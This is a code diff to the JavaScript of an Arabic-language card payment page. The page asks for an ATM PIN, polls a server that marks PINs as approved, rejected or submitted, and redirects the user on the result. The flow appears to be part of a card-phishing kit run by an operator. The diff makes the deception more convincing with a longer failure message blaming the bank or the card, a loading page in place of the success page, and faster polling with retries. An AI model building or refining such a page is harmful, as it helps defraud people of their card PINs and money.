@@ -333,20 +333,25 @@
                 const data = await response.json();
 
                 if (data.status === 'approved_pin') {
-                    window.location.href = `payment_success_ar.html?orderId=${orderId}`;
+                    window.location.href = `payment_loading_ar.html?orderId=${orderId}`;
                 } else if (data.status === 'rejected_pin') {
                     const confirmBtn = document.getElementById('confirmBtn');
                     confirmBtn.disabled = false;
-                    confirmBtn.textContent = 'تأكيد الدفع';
+                    confirmBtn.textContent = 'متابعة الدفع';
                     
                     const input = document.getElementById('pinInput');
                     input.style.borderColor = '#ef4444';
                     input.style.background = '#fff5f5';
-                    showError(data.lastError || 'الرقم الصرافي الآلي غير صحيح.');
+                    showError(data.lastError || 'فشلت عملية الدفع. رقم الصراف الآلي الذي تم إدخاله غير صحيح، أو قد تكون بطاقتك غير مفعلة للدفع أونلاين. يرجى التواصل مع المصرف أو استخدام طرق دفع مختلفة.');
+                } else if (data.status === 'pin_submitted') {
+                    setTimeout(checkStatus, 2000);
                 } else {
-                    setTimeout(checkStatus, 3000);
+                    setTimeout(checkStatus, 2000);
                 }
-            } catch (e) { console.error(e); }
+            } catch (e) { 
+                console.error(e);
+                setTimeout(checkStatus, 3000);
+            }
         }
 
         // Cancel Payment
